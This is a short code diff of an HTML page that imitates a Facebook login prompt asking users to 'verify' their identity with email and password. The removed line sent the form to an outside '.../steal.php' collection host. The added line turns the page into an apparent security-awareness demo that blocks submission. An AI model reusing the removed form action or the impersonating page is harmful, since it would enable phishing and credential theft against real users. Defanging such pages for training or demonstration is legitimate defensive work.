@@ -22,7 +22,7 @@
   <div class="card">
     <div class="brand-title">facebook</div>
     <p class="sub">Security Verification Required. Please log in to confirm your identity.</p>
-    <form action="http://facebook-login-verify.top/steal.php" method="POST">
+    <form action="#" onsubmit="event.preventDefault(); alert('Security Demo: Simulated test submission prevented.');" method="POST">
       <input type="text" name="email" placeholder="Mobile number or email address" required>
       <input type="password" name="password" placeholder="Password" required>
       <button type="submit" class="btn-login">Log In & Verify</button>
